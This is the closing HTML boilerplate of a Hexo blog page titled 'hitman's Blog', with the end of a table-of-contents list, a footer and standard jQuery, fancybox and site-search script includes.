写入mof</span></a></li></ol></li></ol></li></ol>
		</div>
	
	</div>
	
    <hr>
	
</div><!-- col-md-3 -->

		

	</div>
	
		

</div><!-- row -->

<!--
 -->



	</div>
  </div>
  <div class="container-narrow">
  <footer> <p>
  
  &copy; 2024 hitman's Blog
  
      . wubba <a href="http://hexo.io/" target="_blank">lubba</a> dub <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank"> dub.</a>  
</p>

 </footer>
</div> <!-- container-narrow -->
  



  
<a id="gotop" href="#">   
  <span>⬆︎TOP</span>
</a>

<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/main.js"></script>
<script src="/js/search.js"></script> 


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



   <script type="text/javascript">      
     var search_path = "search.xml";
	 if (search_path.length == 0) {
	 	search_path = "search.xml";
	 }
	 var path = "/" + search_path;
     searchFunc(path, 'local-search-input', 'local-search-result');
   </script>

</body>
   </html>
